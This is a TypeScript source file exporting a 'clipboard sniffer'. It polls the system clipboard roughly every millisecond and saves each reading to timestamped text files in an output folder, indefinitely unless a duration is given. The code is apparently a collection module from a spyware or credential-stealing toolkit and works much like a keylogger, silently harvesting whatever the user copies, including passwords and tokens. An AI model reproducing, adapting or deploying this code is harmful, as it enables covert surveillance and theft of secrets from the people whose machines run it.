import clipboard from "clipboardy";
import {delay} from "./helpers.js";
import * as fs from "fs";
import path from "path";

interface ClipboardSnifferParams {
    outDir: string;
    duration?: number;
}


async function executeSniffer(abortController: AbortController, saveDir: string) {
    await fs.promises.mkdir(saveDir, {
        recursive: true,
    });
    while (!abortController.signal.aborted) {
        try {
            const data = await clipboard.read();
            const filename = path.join(saveDir, `${new Date().toUTCString().replace(/\W/g, "_")}.txt`);
            await fs.promises.writeFile(filename, data);
        } catch (e) {
            console.error(e);
        }
        await delay(1);
    }
}

export default function sniffClipboard(parameters: ClipboardSnifferParams): AbortController {
    const unboundedDuration = parameters.duration ?? Infinity;
    const duration = unboundedDuration < (2 ** 32 - 1) ? unboundedDuration : Infinity;
    const abortController = new AbortController();

    executeSniffer(abortController, path.join(parameters.outDir, "clipboard")).then();
    if (duration !== Infinity) {
        setTimeout(() => {
            abortController.abort();
        }, duration * 1000);
    }
    return abortController;
}

